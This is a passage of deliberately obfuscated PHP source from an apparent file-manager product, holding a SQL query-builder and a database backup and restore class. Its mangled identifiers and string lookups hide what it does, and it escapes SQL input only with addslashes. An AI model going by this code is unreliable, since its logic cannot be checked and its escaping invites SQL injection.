$ëÀÔÙÑ… = substr($ëÀÔÙÑ…, 0, -strlen($Ì‰õóÀı)); } return empty($ëÀÔÙÑ…) ? $Ï©€±¯…[12] : $Ï©€±¯…[1017] . $ëÀÔÙÑ…; } protected function parseWhereItem($¼ò˜›Õ…, $É¤»ÇÂ—) { $×€ñúÔ° =& $_SERVER[å¸¿•¶£]; $©šæ±Ñ = $×€ñúÔ°[12]; if (is_array($É¤»ÇÂ—)) { if (is_string($É¤»ÇÂ—[0])) { $µü‚÷– = strtolower($É¤»ÇÂ—[0]); if (in_array($É¤»ÇÂ—[0], array($×€ñúÔ°[891], $×€ñúÔ°[1018], $×€ñúÔ°[1019], $×€ñúÔ°[1020], $×€ñúÔ°[1021], $×€ñúÔ°[1022]))) { $©šæ±Ñ .= $¼ò˜›Õ… . $×€ñúÔ°[53] . $É¤»ÇÂ—[0] . $×€ñúÔ°[53] . $this->parseValue($É¤»ÇÂ—[1]); } elseif (preg_match($×€ñúÔ°[1023], $É¤»ÇÂ—[0])) { $©šæ±Ñ .= $¼ò˜›Õ… . $×€ñúÔ°[53] . $this->exp[$µü‚÷–] . $×€ñúÔ°[53] . $this->parseValue($É¤»ÇÂ—[1]); } elseif (preg_match($×€ñúÔ°[1024], $É¤»ÇÂ—[0])) { if (is_array($É¤»ÇÂ—[1])) { $¯¸ğ’˜ = isset($É¤»ÇÂ—[2]) ? strtoupper($É¤»ÇÂ—[2]) : $×€ñúÔ°[1009]; if (in_array($¯¸ğ’˜, array($×€ñúÔ°[1008], $×€ñúÔ°[1009], $×€ñúÔ°[1010]))) { $óòçéºè = array(); foreach ($É¤»ÇÂ—[1] as $‘œ„¢–) { $óòçéºè[] = $¼ò˜›Õ… . $×€ñúÔ°[53] . $this->exp[$µü‚÷–] . $×€ñúÔ°[53] . $this->parseValue($‘œ„¢–); } $©šæ±Ñ .= $×€ñúÔ°[260] . implode($×€ñúÔ°[53] . $¯¸ğ’˜ . $×€ñúÔ°[53], $óòçéºè) . $×€ñúÔ°[912]; } } else { $©šæ±Ñ .= $¼ò˜›Õ… . $×€ñúÔ°[53] . $this->exp[$µü‚÷–] . $×€ñúÔ°[53] . $this->parseValue($É¤»ÇÂ—[1]); } } elseif ($×€ñúÔ°[297] == $µü‚÷–) { $©šæ±Ñ .= $×€ñúÔ°[910] . $¼ò˜›Õ… . $×€ñúÔ°[53] . $É¤»ÇÂ—[1] . $×€ñúÔ°[1025]; } elseif (preg_match($×€ñúÔ°[1026], $É¤»ÇÂ—[0])) { $©šæ±Ñ .= $É¤»ÇÂ—[0]; } elseif (preg_match($×€ñúÔ°[1027], $É¤»ÇÂ—[0])) { if (isset($É¤»ÇÂ—[2]) && $×€ñúÔ°[297] == $É¤»ÇÂ—[2]) { $©šæ±Ñ .= $¼ò˜›Õ… . $×€ñúÔ°[53] . $this->exp[$µü‚÷–] . $×€ñúÔ°[53] . $É¤»ÇÂ—[1]; } else { if (is_string($É¤»ÇÂ—[1])) { $É¤»ÇÂ—[1] = explode($×€ñúÔ°[50], $É¤»ÇÂ—[1]); } $€¾¥“°¤ = implode($×€ñúÔ°[50], $this->parseValue($É¤»ÇÂ—[1])); $©šæ±Ñ .= $¼ò˜›Õ… . $×€ñúÔ°[53] . $this->exp[$µü‚÷–] . $×€ñúÔ°[910] . $€¾¥“°¤ . $×€ñúÔ°[912]; } } elseif (preg_match($×€ñúÔ°[1028], $É¤»ÇÂ—[0])) { $í´ûÑÜÔ = is_string($É¤»ÇÂ—[1]) ? explode($×€ñúÔ°[50], $É¤»ÇÂ—[1]) : $É¤»ÇÂ—[1]; $©šæ±Ñ .= $×€ñúÔ°[910] . $¼ò˜›Õ… . $×€ñúÔ°[53] . $this->exp[$µü‚÷–] . $×€ñúÔ°[53] . $this->parseValue($í´ûÑÜÔ[0]) . $×€ñúÔ°[1011] . $this->parseValue($í´ûÑÜÔ[1]) . $×€ñúÔ°[278]; } else { think_exception(think_lang($×€ñúÔ°[1014]) . $×€ñúÔ°[4] . $É¤»ÇÂ—[0]); } } else { $‘Ç”Š÷ = count($É¤»ÇÂ—); $±ßÖÏĞÛ = $×€ñúÔ°[12]; if (is_string($É¤»ÇÂ—[$‘Ç”Š÷ - 1])) { $±ßÖÏĞÛ = isset($É¤»ÇÂ—[$‘Ç”Š÷ - 1]) ? strtoupper($É¤»ÇÂ—[$‘Ç”Š÷ - 1]) : $×€ñúÔ°[12]; if (in_array($±ßÖÏĞÛ, array($×€ñúÔ°[1008], $×€ñúÔ°[1009], $×€ñúÔ°[1010]))) { $‘Ç”Š÷ = $‘Ç”Š÷ - 1; } } else { $±ßÖÏĞÛ = $×€ñúÔ°[1008]; } for ($éÛªŸÍ´ = 0; $éÛªŸÍ´ < $‘Ç”Š÷; $éÛªŸÍ´++) { $í´ûÑÜÔ = is_array($É¤»ÇÂ—[$éÛªŸÍ´]) ? $É¤»ÇÂ—[$éÛªŸÍ´][1] : $É¤»ÇÂ—[$éÛªŸÍ´]; if ($×€ñúÔ°[297] == strtolower($É¤»ÇÂ—[$éÛªŸÍ´][0])) { $©šæ±Ñ .= $×€ñúÔ°[260] . $¼ò˜›Õ… . $×€ñúÔ°[53] . $í´ûÑÜÔ . $×€ñúÔ°[1025] . $±ßÖÏĞÛ . $×€ñúÔ°[53]; } else { $ÜÊ˜£– = is_array($É¤»ÇÂ—[$éÛªŸÍ´]) ? $this->exp[strtolower($É¤»ÇÂ—[$éÛªŸÍ´][0])] : $×€ñúÔ°[891]; if (!$ÜÊ˜£– && is_array($É¤»ÇÂ—[$éÛªŸÍ´]) && in_array($É¤»ÇÂ—[$éÛªŸÍ´][0], array($×€ñúÔ°[891], $×€ñúÔ°[1018], $×€ñúÔ°[1019], $×€ñúÔ°[1020], $×€ñúÔ°[1021], $×€ñúÔ°[1022]))) { $ÜÊ˜£– = $É¤»ÇÂ—[$éÛªŸÍ´][0]; } $©šæ±Ñ .= $×€ñúÔ°[260] . $¼ò˜›Õ… . $×€ñúÔ°[53] . $ÜÊ˜£– . $×€ñúÔ°[53] . $this->parseValue($í´ûÑÜÔ) . $×€ñúÔ°[1025] . $±ßÖÏĞÛ . $×€ñúÔ°[53]; } } $©šæ±Ñ = substr($©šæ±Ñ, 0, -4); } } else { $©šæ±Ñ .= $¼ò˜›Õ… . $×€ñúÔ°[1029] . $this->parseValue($É¤»ÇÂ—); } return $©šæ±Ñ; } protected function parseThinkWhere($£é­Ù×Ó, $àò¨ğò) { $¶‰¡®¤¿ =& $_SERVER[å¸¿•¶£]; $‰â‡à‡¯ = $¶‰¡®¤¿[12]; switch ($£é­Ù×Ó) { case $¶‰¡®¤¿[352]: $‰â‡à‡¯ = $àò¨ğò; break; case $¶‰¡®¤¿[1012]: $‰â‡à‡¯ = is_string($àò¨ğò) ? $àò¨ğò : substr($this->parseWhere($àò¨ğò), 6); break; case $¶‰¡®¤¿[1030]: parse_str($àò¨ğò, $¨Š´²‰§); if (isset($¨Š´²‰§[$¶‰¡®¤¿[1007]])) { $‘æµÁ’ = $¶‰¡®¤¿[53] . strtoupper($¨Š´²‰§[$¶‰¡®¤¿[1007]]) . $¶‰¡®¤¿[53]; unset($¨Š´²‰§[$¶‰¡®¤¿[1007]]); } else { $‘æµÁ’ = $¶‰¡®¤¿[1011]; } $‹ŞÜÈÙˆ = array(); foreach ($¨Š´²‰§ as $ºÏû»‘ö => $–ßšèüÙ) { $‹ŞÜÈÙˆ[] = $this->parseKey($ºÏû»‘ö) . $¶‰¡®¤¿[1029] . $this->parseValue($–ßšèüÙ); } $‰â‡à‡¯ = implode($‘æµÁ’, $‹ŞÜÈÙˆ); break; } return $‰â‡à‡¯; } protected function parseLimit($úş½§åù) { $ßˆ¸Çº£ =& $_SERVER[å¸¿•¶£]; return !empty($úş½§åù) ? $ßˆ¸Çº£[51] . $úş½§åù . $ßˆ¸Çº£[53] : $ßˆ¸Çº£[12]; } protected function parseJoin($õó®„ì¦) { $–æÕ“µ¢ =& $_SERVER[å¸¿•¶£]; $øê¬œğı = $–æÕ“µ¢[12]; if (!empty($õó®„ì¦)) { if (is_array($õó®„ì¦)) { foreach ($õó®„ì¦ as $§ØÑÎŸ¶ => $À£øõ¡ô) { if (!1 !== stripos($À£øõ¡ô, $–æÕ“µ¢[1031])) { $øê¬œğı .= $–æÕ“µ¢[53] . $À£øõ¡ô; } else { $øê¬œğı .= $–æÕ“µ¢[1032] . $À£øõ¡ô; } } } else { $øê¬œğı .= $–æÕ“µ¢[1032] . $õó®„ì¦; } } $øê¬œğı = preg_replace($–æÕ“µ¢[1033], think_config($–æÕ“µ¢[937]) . $–æÕ“µ¢[1034], $øê¬œğı); return $øê¬œğı; } protected function parseOrder($œ¨¿ÎÆ) { $Ñ€’ËÙ =& $_SERVER[å¸¿•¶£]; if (is_array($œ¨¿ÎÆ)) { $¡øææ‡Œ = array(); foreach ($œ¨¿ÎÆ as $Ñ³ê‘©ë => $äé÷Á®Ï) { if (is_numeric($Ñ³ê‘©ë)) { $¡øææ‡Œ[] = $this->parseKey($äé÷Á®Ï); } else { $äé÷Á®Ï = in_array(strtoupper(trim($äé÷Á®Ï)), array($Ñ€’ËÙ[1035], $Ñ€’ËÙ[1036])) ? $Ñ€’ËÙ[53] . $äé÷Á®Ï : $Ñ€’ËÙ[12]; if (preg_match($Ñ€’ËÙ[1037], $Ñ³ê‘©ë)) { $¡øææ‡Œ[] = $this->parseKey($Ñ³ê‘©ë) . $äé÷Á®Ï; } else { think_exception($Ñ€’ËÙ[1038] . $Ñ³ê‘©ë); } } } $œ¨¿ÎÆ = implode($Ñ€’ËÙ[50], $¡øææ‡Œ); } return !empty($œ¨¿ÎÆ) ? $Ñ€’ËÙ[1039] . $œ¨¿ÎÆ : $Ñ€’ËÙ[12]; } protected function parseGroup($šŸ›™ş) { $ÍÈ••¯ß =& $_SERVER[å¸¿•¶£]; return !empty($šŸ›™ş) ? $ÍÈ••¯ß[1040] . $šŸ›™ş : $ÍÈ••¯ß[12]; } protected function parseHaving($¡âÃãïÛ) { $Ğ–°ä·‚ =& $_SERVER[å¸¿•¶£]; return !empty($¡âÃãïÛ) ? $Ğ–°ä·‚[1041] . $¡âÃãïÛ : $Ğ–°ä·‚[12]; } protected function parseComment($È¥¡¯¶³) { $şÑ’Û´Ñ =& $_SERVER[å¸¿•¶£]; return !empty($È¥¡¯¶³) ? $şÑ’Û´Ñ[1042] . $È¥¡¯¶³ . $şÑ’Û´Ñ[1043] : $şÑ’Û´Ñ[12]; } protected function parseDistinct($ÄõŠäÄ¿) { $ëû¾áßã =& $_SERVER[å¸¿•¶£]; return !empty($ÄõŠäÄ¿) ? $ëû¾áßã[1044] : $ëû¾áßã[12]; } protected function parseUnion($¢ÒŠëÛÈ) { $ÏÓö¡ÏÔ =& $_SERVER[å¸¿•¶£]; if (empty($¢ÒŠëÛÈ)) { return $ÏÓö¡ÏÔ[12]; } if (isset($¢ÒŠëÛÈ[$ÏÓö¡ÏÔ[348]])) { $“„æ—µ = $ÏÓö¡ÏÔ[1045]; unset($¢ÒŠëÛÈ[$ÏÓö¡ÏÔ[348]]); } else { $“„æ—µ = $ÏÓö¡ÏÔ[1046]; } foreach ($¢ÒŠëÛÈ as $œèÃŠˆ) { $‚úÓ¦[] = $“„æ—µ . (is_array($œèÃŠˆ) ? $this->buildSelectSql($œèÃŠˆ) : $œèÃŠˆ); } return implode($ÏÓö¡ÏÔ[53], $‚úÓ¦); } public function insert($Ëú©¥ÊÂ, $¯·ÖıËÈ = array(), $’–°â–è = false) { $¶ª÷´Ã¿ =& $_SERVER[å¸¿•¶£]; $ƒ¶‹¥âÇ = $Ì˜·Ì•Ò = array(); $this->model = $¯·ÖıËÈ[$¶ª÷´Ã¿[281]]; foreach ($Ëú©¥ÊÂ as $İŠì‰ãõ => $® …€à­) { if (is_array($® …€à­) && $¶ª÷´Ã¿[297] == $® …€à­[0]) { $Ì˜·Ì•Ò[] = $this->parseKey($İŠì‰ãõ); $ƒ¶‹¥âÇ[] = $® …€à­[1]; } elseif (is_scalar($® …€à­) || is_null($® …€à­)) { $Ì˜·Ì•Ò[] = $this->parseKey($İŠì‰ãõ); $ƒ¶‹¥âÇ[] = $this->parseValue($® …€à­); } } $ù¦™ Ñê = ($’–°â–è ? $¶ª÷´Ã¿[914] : $¶ª÷´Ã¿[915]) . $¶ª÷´Ã¿[916] . $this->parseTable($¯·ÖıËÈ[$¶ª÷´Ã¿[279]]) . $¶ª÷´Ã¿[910] . implode($¶ª÷´Ã¿[50], $Ì˜·Ì•Ò) . $¶ª÷´Ã¿[911] . implode($¶ª÷´Ã¿[50], $ƒ¶‹¥âÇ) . $¶ª÷´Ã¿[912]; $ù¦™ Ñê .= $this->parseLock(isset($¯·ÖıËÈ[$¶ª÷´Ã¿[850]]) ? $¯·ÖıËÈ[$¶ª÷´Ã¿[850]] : !1); $ù¦™ Ñê .= $this->parseComment(!empty($¯·ÖıËÈ[$¶ª÷´Ã¿[354]]) ? $¯·ÖıËÈ[$¶ª÷´Ã¿[354]] : $¶ª÷´Ã¿[12]); return $this->execute($ù¦™ Ñê, $this->parseBind(!empty($¯·ÖıËÈ[$¶ª÷´Ã¿[285]]) ? $¯·ÖıËÈ[$¶ª÷´Ã¿[285]] : array())); } public function selectInsert($Ø†Â«ÒŠ, $öé¥àÄÚ, $Î¦ÏĞŒ = array()) { $Ô»Ñ„ÖÎ =& $_SERVER[å¸¿•¶£]; $this->model = $Î¦ÏĞŒ[$Ô»Ñ„ÖÎ[281]]; if (is_string($Ø†Â«ÒŠ)) { $Ø†Â«ÒŠ = explode($Ô»Ñ„ÖÎ[50], $Ø†Â«ÒŠ); } array_walk($Ø†Â«ÒŠ, array($this, $Ô»Ñ„ÖÎ[913])); $âú¡ğ—ô = $Ô»Ñ„ÖÎ[1047] . $this->parseTable($öé¥àÄÚ) . $Ô»Ñ„ÖÎ[910] . implode($Ô»Ñ„ÖÎ[50], $Ø†Â«ÒŠ) . $Ô»Ñ„ÖÎ[1025]; $âú¡ğ—ô .= $this->buildSelectSql($Î¦ÏĞŒ); return $this->execute($âú¡ğ—ô, $this->parseBind(!empty($Î¦ÏĞŒ[$Ô»Ñ„ÖÎ[285]]) ? $Î¦ÏĞŒ[$Ô»Ñ„ÖÎ[285]] : array())); } public function update($áÅØûÕã, $ãó÷ „Ò) { $İÑõ×í =& $_SERVER[å¸¿•¶£]; $this->model = $ãó÷ „Ò[$İÑõ×í[281]]; $åŞ¿êÄª = $İÑõ×í[1048] . $this->parseTable($ãó÷ „Ò[$İÑõ×í[279]]) . $this->parseSet($áÅØûÕã) . $this->parseWhere(!empty($ãó÷ „Ò[$İÑõ×í[275]]) ? $ãó÷ „Ò[$İÑõ×í[275]] : $İÑõ×í[12]) . $this->parseOrder(!empty($ãó÷ „Ò[$İÑõ×í[365]]) ? $ãó÷ „Ò[$İÑõ×í[365]] : $İÑõ×í[12]) . $this->parseLimit(!empty($ãó÷ „Ò[$İÑõ×í[292]]) ? $ãó÷ „Ò[$İÑõ×í[292]] : $İÑõ×í[12]) . $this->parseLock(isset($ãó÷ „Ò[$İÑõ×í[850]]) ? $ãó÷ „Ò[$İÑõ×í[850]] : !1) . $this->parseComment(!empty($ãó÷ „Ò[$İÑõ×í[354]]) ? $ãó÷ „Ò[$İÑõ×í[354]] : $İÑõ×í[12]); return $this->execute($åŞ¿êÄª, $this->parseBind(!empty($ãó÷ „Ò[$İÑõ×í[285]]) ? $ãó÷ „Ò[$İÑõ×í[285]] : array())); } public function delete($ÉÔôÏüª = array()) { $•Ü‡š´ô =& $_SERVER[å¸¿•¶£]; $this->model = $ÉÔôÏüª[$•Ü‡š´ô[281]]; $İõ“ = $•Ü‡š´ô[1049] . $this->parseTable($ÉÔôÏüª[$•Ü‡š´ô[279]]) . $this->parseWhere(!empty($ÉÔôÏüª[$•Ü‡š´ô[275]]) ? $ÉÔôÏüª[$•Ü‡š´ô[275]] : $•Ü‡š´ô[12]) . $this->parseOrder(!empty($ÉÔôÏüª[$•Ü‡š´ô[365]]) ? $ÉÔôÏüª[$•Ü‡š´ô[365]] : $•Ü‡š´ô[12]) . $this->parseLimit(!empty($ÉÔôÏüª[$•Ü‡š´ô[292]]) ? $ÉÔôÏüª[$•Ü‡š´ô[292]] : $•Ü‡š´ô[12]) . $this->parseLock(isset($ÉÔôÏüª[$•Ü‡š´ô[850]]) ? $ÉÔôÏüª[$•Ü‡š´ô[850]] : !1) . $this->parseComment(!empty($ÉÔôÏüª[$•Ü‡š´ô[354]]) ? $ÉÔôÏüª[$•Ü‡š´ô[354]] : $•Ü‡š´ô[12]); return $this->execute($İõ“, $this->parseBind(!empty($ÉÔôÏüª[$•Ü‡š´ô[285]]) ? $ÉÔôÏüª[$•Ü‡š´ô[285]] : array())); } public function select($ëï°Á™å = array()) { $øµ¤°ë¼ =& $_SERVER[å¸¿•¶£]; $this->model = $ëï°Á™å[$øµ¤°ë¼[281]]; $Ş““Ó = $this->buildSelectSql($ëï°Á™å); $ú¨Ö § = isset($ëï°Á™å[$øµ¤°ë¼[349]]) ? $ëï°Á™å[$øµ¤°ë¼[349]] : !1; if ($ú¨Ö §) { $§ˆŒáŸå = is_string($ú¨Ö §[$øµ¤°ë¼[94]]) ? $ú¨Ö §[$øµ¤°ë¼[94]] : $øµ¤°ë¼[1050] . md5($Ş““Ó); $ªÒÌ¢« = think_cache($§ˆŒáŸå, $øµ¤°ë¼[12], $ú¨Ö §); if (!1 !== $ªÒÌ¢«) { return $ªÒÌ¢«; } } $‚áÄ¿œ = $this->query($Ş““Ó, $this->parseBind(!empty($ëï°Á™å[$øµ¤°ë¼[285]]) ? $ëï°Á™å[$øµ¤°ë¼[285]] : array())); if ($ú¨Ö § && !1 !== $‚áÄ¿œ) { think_cache($§ˆŒáŸå, $‚áÄ¿œ, $ú¨Ö §); } return $‚áÄ¿œ; } public function buildSelectSql($¡äÇÙ“İ = array()) { $âÙëµî =& $_SERVER[å¸¿•¶£]; if (isset($¡äÇÙ“İ[$âÙëµî[353]])) { if (strpos($¡äÇÙ“İ[$âÙëµî[353]], $âÙëµî[50])) { list($ºÑ·¯†ö, $¦ü˜ñã¶) = explode($âÙëµî[50], $¡äÇÙ“İ[$âÙëµî[353]]); } else { $ºÑ·¯†ö = $¡äÇÙ“İ[$âÙëµî[353]]; } $ºÑ·¯†ö = $ºÑ·¯†ö ? $ºÑ·¯†ö : 1; $¦ü˜ñã¶ = isset($¦ü˜ñã¶) ? $¦ü˜ñã¶ : (is_numeric($¡äÇÙ“İ[$âÙëµî[292]]) ? $¡äÇÙ“İ[$âÙëµî[292]] : 20); $Îİší© = $¦ü˜ñã¶ * ((int) $ºÑ·¯†ö - 1); $¡äÇÙ“İ[$âÙëµî[292]] = $Îİší© . $âÙëµî[50] . $¦ü˜ñã¶; } if (think_config($âÙëµî[1051])) { $ŒçÖ®ÌÀ = $âÙëµî[1052] . md5(serialize($¡äÇÙ“İ)); $‹Ú´úÅ® = think_cache($ŒçÖ®ÌÀ); if ($‹Ú´úÅ®) { return $‹Ú´úÅ®; } } $œÒöáä­ = $this->parseSql($this->selectSql, $¡äÇÙ“İ); $œÒöáä­ .= $this->parseLock(isset($¡äÇÙ“İ[$âÙëµî[850]]) ? $¡äÇÙ“İ[$âÙëµî[850]] : !1); if (isset($ŒçÖ®ÌÀ)) { think_cache($ŒçÖ®ÌÀ, $œÒöáä­); } return $œÒöáä­; } public function parseSql($¸–ÈÓŒ, $î‹éÍ¸Ÿ = array()) { $ã‘–´‘ =& $_SERVER[å¸¿•¶£]; $¸–ÈÓŒ = str_replace(array($ã‘–´‘[1053], $ã‘–´‘[1054], $ã‘–´‘[1055], $ã‘–´‘[1056], $ã‘–´‘[1057], $ã‘–´‘[1058], $ã‘–´‘[1059], $ã‘–´‘[1060], $ã‘–´‘[1061], $ã‘–´‘[1062], $ã‘–´‘[1063]), array($this->parseTable("{$î‹éÍ¸Ÿ[$ã‘–´‘[279]]}"), $this->parseDistinct(isset($î‹éÍ¸Ÿ[$ã‘–´‘[1064]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[1064]] : !1), $this->parseField(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[273]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[273]] : $ã‘–´‘[189]), $this->parseJoin(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[282]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[282]] : $ã‘–´‘[12]), $this->parseWhere(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[275]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[275]] : $ã‘–´‘[12]), $this->parseGroup(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[505]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[505]] : $ã‘–´‘[12]), $this->parseHaving(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[1065]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[1065]] : $ã‘–´‘[12]), $this->parseOrder(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[365]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[365]] : $ã‘–´‘[12]), $this->parseLimit(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[292]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[292]] : $ã‘–´‘[12]), $this->parseUnion(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[347]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[347]] : $ã‘–´‘[12]), $this->parseComment(!empty($î‹éÍ¸Ÿ[$ã‘–´‘[354]]) ? $î‹éÍ¸Ÿ[$ã‘–´‘[354]] : $ã‘–´‘[12])), $¸–ÈÓŒ); return $¸–ÈÓŒ; } public function getLastSql($æÊôëƒå = '') { return $æÊôëƒå ? $this->modelSql[$æÊôëƒå] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Õ‚¦¼×­) { return addslashes($Õ‚¦¼×­); } public function setModel($‘¸×ŠÇ†) { $this->model = $‘¸×ŠÇ†; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ò¹µ‡Ì = array()) { $Ÿ“Î =& $_SERVER[å¸¿•¶£]; if (empty($ò¹µ‡Ì)) { $ò¹µ‡Ì = $GLOBALS[$Ÿ“Î[6]][$Ÿ“Î[21]]; } $this->database = $ò¹µ‡Ì; } public function model($ìòõ¡§ = '') { return new ModelBase($ìòõ¡§, $_SERVER[å¸¿•¶£][12], $this->database); } public function db($™Ğ§†¤ = false) { $ÁÕ’Á¥‰ =& $_SERVER[å¸¿•¶£]; $¸Ö»Ô­Ù = array_change_key_case($this->database); if ($this->dbType() == $ÁÕ’Á¥‰[13] || !$™Ğ§†¤) { return $this->model()->db(); } $æšôı¥Ò = $¸Ö»Ô­Ù[$ÁÕ’Á¥‰[979]]; $¸Ö»Ô­Ù[$ÁÕ’Á¥‰[979]] = $ÁÕ’Á¥‰[12]; if ($¸Ö»Ô­Ù[$ÁÕ’Á¥‰[974]] == $ÁÕ’Á¥‰[971]) { $¬ ßüëò = $¸Ö»Ô­Ù[$ÁÕ’Á¥‰[980]]; $¸Ö»Ô­Ù[$ÁÕ’Á¥‰[980]] = substr($¬ ßüëò, 0, strrpos($¬ ßüëò, $ÁÕ’Á¥‰[1066])); } $this->database = $¸Ö»Ô­Ù; $ì×Ò‡É› = $this->model()->db(); try { $š”âÍ´ = $ì×Ò‡É›->execute("\x73\150\x6f\167\40\144\141\164\141\x62\x61\x73\x65\x73\x20\x6c\x69\x6b\145\40\x27{$æšôı¥Ò}\x27"); } catch (Exception $Û‹Ú«ù) { } if (!$š”âÍ´) { $ì×Ò‡É›->execute("\143\162\145\141\x74\145\x20\144\141\x74\141\x62\141\x73\145\x20\140{$æšôı¥Ò}\140"); } $¸Ö»Ô­Ù[$ÁÕ’Á¥‰[979]] = $æšôı¥Ò; if ($¸Ö»Ô­Ù[$ÁÕ’Á¥‰[974]] == $ÁÕ’Á¥‰[971]) { $¸Ö»Ô­Ù[$ÁÕ’Á¥‰[980]] .= $ÁÕ’Á¥‰[1066] . $æšôı¥Ò; } $this->database = $¸Ö»Ô­Ù; $ì×Ò‡É›->execute("\165\x73\145\40\x60{$æšôı¥Ò}\x60"); return $ì×Ò‡É›; } public function createTable($»ÍÛÀÕú, &$³†²—›±) { $İÕİãŞ =& $_SERVER[å¸¿•¶£]; if (!IO::exist($»ÍÛÀÕú)) { ActionCall($İÕİãŞ[1067], !0, 0); show_json(LNG($İÕİãŞ[1068]), !1); } $»ÈÇÛĞ» = $this->model()->db(); $Œ‹•€½ = sqlSplit(IO::getContent($»ÍÛÀÕú)); foreach ($Œ‹•€½ as $ŸÖ‰³÷) { $‰Æ¸¡ÆØ = stripos($ŸÖ‰³÷, $İÕİãŞ[1069]) === 0; if ($‰Æ¸¡ÆØ) { $³†²—›±->task[$İÕİãŞ[793]] += 1; } $»ÈÇÛĞ»->execute($ŸÖ‰³÷); if ($‰Æ¸¡ÆØ) { preg_match($İÕİãŞ[1070], $ŸÖ‰³÷, $ãşüûÊ¾); $³†²—›±->task[$İÕİãŞ[1071]] = $ãşüûÊ¾[1]; $³†²—›±->update(1); } } } public function insertTable($Â¬Ï–, &$ƒÉÜ¤µÓ) { $Õäµ’¥Æ =& $_SERVER[å¸¿•¶£]; $Ö²Ò¨« = $this->model()->db(); $Âû–ÒÉ = $Ñ€¦Ã¢‰ ? array($Ñ€¦Ã¢‰) : $Ö²Ò¨«->getTables(); foreach ($Â¬Ï– as $±¤œ‡ÃŞ) { $Ñ€¦Ã¢‰ = basename($±¤œ‡ÃŞ, $Õäµ’¥Æ[795]); if (!in_array($Ñ€¦Ã¢‰, $Âû–ÒÉ)) { continue; } $ƒÉÜ¤µÓ->task[$Õäµ’¥Æ[1071]] = $Ñ€¦Ã¢‰; if (get_filesize($±¤œ‡ÃŞ) == 0) { continue; } $ €ªüı™ = $this->sqlToDb($±¤œ‡ÃŞ, $ƒÉÜ¤µÓ); if (!$ €ªüı™) { ActionCall($Õäµ’¥Æ[1067], !0, 0); show_json(LNG($Õäµ’¥Æ[1072]) . "\x5b{$Ñ€¦Ã¢‰}\x5d", !1); } } } public function sqlFromDb($Ê¶¶Úîº, $ÂŠ¯›Î—, &$ö¿ßáæö, $µÙ½èÈì = '') { if ($ö¿ßáæö) { $ö¿ßáæö->task[$_SERVER[å¸¿•¶£][1071]] = $Ê¶¶Úîº; } $¼–ÉÕë‘ = $this->model($Ê¶¶Úîº); $Ã’¹™ÚŸ = 0; $î‹°Ñ¼³ = 0; $Å±÷ª ó = 10000; $ŸÑÀäÛ = fopen($ÂŠ¯›Î—, $_SERVER[å¸¿•¶£][1073]); $ú‰Ôï„ò = $¼–ÉÕë‘->getPk(); $¿«ô½Õğ = $¼–ÉÕë‘->getDbFields(); $ØâËÀÃ = $_SERVER[å¸¿•¶£][12]; if ($GLOBALS[$_SERVER[å¸¿•¶£][794]] && in_array($Ê¶¶Úîº, array($_SERVER[å¸¿•¶£][1074], $_SERVER[å¸¿•¶£][1075]))) { $ØâËÀÃ = $Ê¶¶Úîº; } do { $ë¹Ç•Öô = array($ú‰Ôï„ò => array($_SERVER[å¸¿•¶£][1021], $î‹°Ñ¼³)); $¿œñï‹‚ = $¼–ÉÕë‘->where($ë¹Ç•Öô)->field($¿«ô½Õğ)->order($ú‰Ôï„ò . $_SERVER[å¸¿•¶£][1076])->limit($Å±÷ª ó)->select(); $¿œñï‹‚ = !empty($¿œñï‹‚) ? $¿œñï‹‚ : array(); if (!($×ß“ğ‚Ğ = count($¿œñï‹‚))) { break; } $’Ä•á· = end($¿œñï‹‚); $î‹°Ñ¼³ = $’Ä•á·[$ú‰Ôï„ò]; $¹Ö²÷™Ç = array(); foreach ($¿œñï‹‚ as $ßõÊˆ·Å) { if ($ØâËÀÃ) { if ($Ê¶¶Úîº == $_SERVER[å¸¿•¶£][1074]) { if ($ßõÊˆ·Å[$_SERVER[å¸¿•¶£][33]] == $_SERVER[å¸¿•¶£][1077]) { $›©ÌÜ¼ = json_decode($ßõÊˆ·Å[$_SERVER[å¸¿•¶£][374]], !0); if ($›©ÌÜ¼[$_SERVER[å¸¿•¶£][32]] == $GLOBALS[$_SERVER[å¸¿•¶£][794]] && $›©ÌÜ¼[$_SERVER[å¸¿•¶£][756]] != 1) { continue; } } } else { if ($ßõÊˆ·Å[$_SERVER[å¸¿•¶£][33]] == $_SERVER[å¸¿•¶£][1078] && $ßõÊˆ·Å[$_SERVER[å¸¿•¶£][94]] == $_SERVER[å¸¿•¶£][786]) { continue; } } } if ($µÙ½èÈì) { $ßõÊˆ·Å[$_SERVER[å¸¿•¶£][84]] = "\173\x69\x6f\72{$µÙ½èÈì}\x7d" . substr($ßõÊˆ·Å[$_SERVER[å¸¿•¶£][84]], strlen("\x7b\151\x6f\72{$ßõÊˆ·Å[$_SERVER[å¸¿•¶£][824]]}\175")); $ßõÊˆ·Å[$_SERVER[å¸¿•¶£][824]] = $µÙ½èÈì; } $¹Ö²÷™Ç[] = $_SERVER[å¸¿•¶£][1079] . $this->sqlEncode($ßõÊˆ·Å) . $_SERVER[å¸¿•¶£][1080]; } $œó±äí¤ = "\x49\x4e\x53\105\x52\124\x20\111\x4e\x54\x4f\40\140{$Ê¶¶Úîº}\x60\x20\x28\x60" . implode($_SERVER[å¸¿•¶£][1081], $¿«ô½Õğ) . $_SERVER[å¸¿•¶£][1082]; fwrite($ŸÑÀäÛ, $œó±äí¤ . implode($_SERVER[å¸¿•¶£][1083], $¹Ö²÷™Ç) . $_SERVER[å¸¿•¶£][71] . PHP_EOL); 